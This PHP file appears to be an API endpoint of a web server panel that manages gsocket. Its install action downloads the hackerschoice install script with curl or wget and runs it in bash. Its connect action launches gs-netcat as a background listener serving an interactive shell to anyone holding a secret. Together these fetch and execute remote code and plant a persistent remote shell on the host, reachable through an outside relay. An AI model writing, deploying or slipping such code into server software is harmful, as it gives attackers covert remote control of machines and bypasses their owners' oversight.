<?php
require_once __DIR__ . '/../config/auth.php';
requireLogin();
header('Content-Type: application/json');
$action = $_GET['action'] ?? $_POST['action'] ?? '';
switch ($action) {
    case 'status':  gsocketStatus(); break;
    case 'install': installGsocket(); break;
    case 'connect': connectGsocket(); break;
    case 'stop':    stopGsocket(); break;
    default: jsonResponse(['error' => 'Unknown action'], 400);
}

function gsocketStatus(): void {
    $binDir = GSOCKET_INSTALL_DIR;
    $gs     = $binDir . '/gs-netcat';
    $gsbd   = $binDir . '/gs-bd';
    $found  = file_exists($gs) || file_exists($gsbd);
    $version = '';
    if ($found && function_exists('shell_exec')) {
        $v = shell_exec(escapeshellarg($found ? ($gs ?: $gsbd) : '') . ' --version 2>&1 | head -1');
        $version = trim($v ?? '');
    }
    // Check if running
    $running = false;
    if (function_exists('shell_exec')) {
        $pids = shell_exec("pgrep -f gs-netcat 2>/dev/null");
        $running = !empty(trim($pids ?? ''));
    }
    jsonResponse([
        'success'   => true,
        'installed' => $found,
        'version'   => $version,
        'bin_dir'   => $binDir,
        'running'   => $running,
    ]);
}

function installGsocket(): void {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') { jsonResponse(['error' => 'POST required'], 405); return; }
    if (!function_exists('shell_exec')) { jsonResponse(['error' => 'shell_exec disabled'], 503); return; }

    $binDir = GSOCKET_INSTALL_DIR;
    if (!is_dir($binDir)) @mkdir($binDir, 0755, true);

    // Detect OS/arch
    $os   = strtolower(php_uname('s'));
    $arch = trim(shell_exec('uname -m 2>/dev/null') ?? 'x86_64');
    $steps = [];

    // Try curl/wget
    $hasCurl = !empty(shell_exec('which curl 2>/dev/null'));
    $hasWget  = !empty(shell_exec('which wget 2>/dev/null'));

    if (!$hasCurl && !$hasWget) {
        jsonResponse(['error' => 'curl or wget is required to download gsocket'], 503); return;
    }

    // Use the official gsocket installer
    $installScript = 'https://raw.githubusercontent.com/hackerschoice/gsocket/master/tools/install.sh';
    $tmpScript = sys_get_temp_dir() . '/gs_install.sh';

    if ($hasCurl) {
        $dl = shell_exec("curl -fsSL " . escapeshellarg($installScript) . " -o " . escapeshellarg($tmpScript) . " 2>&1");
    } else {
        $dl = shell_exec("wget -q " . escapeshellarg($installScript) . " -O " . escapeshellarg($tmpScript) . " 2>&1");
    }
    $steps[] = 'Downloaded install script';

    if (!file_exists($tmpScript)) {
        jsonResponse(['error' => 'Failed to download install script', 'steps' => $steps], 500); return;
    }

    chmod($tmpScript, 0755);
    // Run installer with prefix to custom dir (no sudo)
    $output = shell_exec("PREFIX=" . escapeshellarg($binDir) . " bash " . escapeshellarg($tmpScript) . " 2>&1");
    $steps[] = $output ?? 'No output';
    @unlink($tmpScript);

    $gs = $binDir . '/gs-netcat';
    $installed = file_exists($gs) || file_exists($binDir . '/gs-bd');
    jsonResponse([
        'success'   => $installed,
        'installed' => $installed,
        'steps'     => $steps,
        'message'   => $installed ? 'GSocket installed successfully!' : 'Installation may have failed, check output',
        'bin_dir'   => $binDir,
    ]);
}

function connectGsocket(): void {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') { jsonResponse(['error' => 'POST required'], 405); return; }
    $secret  = trim($_POST['secret'] ?? '');
    $mode    = $_POST['mode'] ?? 'listen'; // listen | connect
    $binDir  = GSOCKET_INSTALL_DIR;
    $gs      = $binDir . '/gs-netcat';
    if (!file_exists($gs)) { jsonResponse(['error' => 'GSocket not installed'], 404); return; }
    if (empty($secret)) { jsonResponse(['error' => 'Secret required'], 400); return; }

    if ($mode === 'listen') {
        $cmd = "nohup " . escapeshellarg($gs) . " -l -i -s " . escapeshellarg($secret) . " > /tmp/gs_listen.log 2>&1 &";
    } else {
        $cmd = escapeshellarg($gs) . " -s " . escapeshellarg($secret);
    }
    $output = shell_exec($cmd . " 2>&1");
    jsonResponse(['success' => true, 'command' => $cmd, 'output' => trim($output ?? '')]);
}

function stopGsocket(): void {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') { jsonResponse(['error' => 'POST required'], 405); return; }
    shell_exec("pkill -f gs-netcat 2>&1");
    jsonResponse(['success' => true, 'message' => 'GSocket processes stopped']);
}
